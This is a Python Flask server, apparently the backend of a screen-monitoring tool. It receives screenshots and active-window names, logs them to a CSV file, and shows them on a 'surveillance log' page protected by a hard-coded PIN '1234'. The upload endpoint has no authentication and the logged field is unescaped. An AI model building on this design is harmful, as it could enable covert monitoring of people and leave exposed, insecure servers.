import os
import csv
from flask import Flask, request, send_from_directory, render_template_string, redirect, url_for
import datetime

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, "screenshots")
LOG_FILE = os.path.join(BASE_DIR, "app_logs.csv")
ACCESS_PIN = "1234"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding='utf-8') as f:
        f.write("datetime,app_name,screenshot\n")

# HTML-шаблон для ввода PIN-кода
PIN_PAGE_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Вход в систему</title>
</head>
<body>
    <h2>Введите PIN-код</h2>
    <form method="GET" action="/data">
        <input type="password" name="pin" placeholder="PIN-код" required>
        <button type="submit">Войти</button>
    </form>
</body>
</html>
'''

# HTML-шаблон для отображения списка скриншотов
DATA_PAGE_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Журнал скриншотов</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; }
        th { background-color: #f2f2f2; }
        tr:hover { background-color: #f9f9f9; }
        a { text-decoration: none; color: #333; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>Журнал наблюдения</h1>
    <table>
        <tr>
            <th>Дата и время</th>
            <th>Активное окно</th>
            <th>Скриншот</th>
        </tr>
        {% for entry in entries %}
        <tr>
            <td>{{ entry.datetime }}</td>
            <td>{{ entry.app_name }}</td>
            <td><a href="/screenshot/{{ entry.screenshot }}" target="_blank">{{ entry.screenshot }}</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(PIN_PAGE_HTML)

@app.route('/data')
def data():
    pin = request.args.get("pin", "")
    if pin != ACCESS_PIN:
        return "Неверный PIN", 403

    entries = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, newline='', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)
            for row in reader:
                # Проверяем, чтобы поля были в строке
                if 'datetime' in row and 'app_name' in row and 'screenshot' in row:
                    entries.append({
                        "datetime": row["datetime"],
                        "app_name": row["app_name"],
                        "screenshot": row["screenshot"]
                    })

    return render_template_string(DATA_PAGE_HTML, entries=entries)

@app.route('/screenshot/<filename>')
def screenshot(filename):
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    print(f"Запрос скриншота: {filename}")
    print(f"Ищу файл по пути: {file_path}, существует: {os.path.exists(file_path)}")
    if not os.path.exists(file_path):
        return "Файл не найден", 404
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('screenshot')
    if not file:
        return "Скриншот не получен", 400

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{timestamp}.png"
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(file_path)

    active_app = request.form.get("active_app", "unknown")

    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"{timestamp},{active_app},{filename}\n")

    return f"Скриншот {filename} получен. Активное окно: {active_app}", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
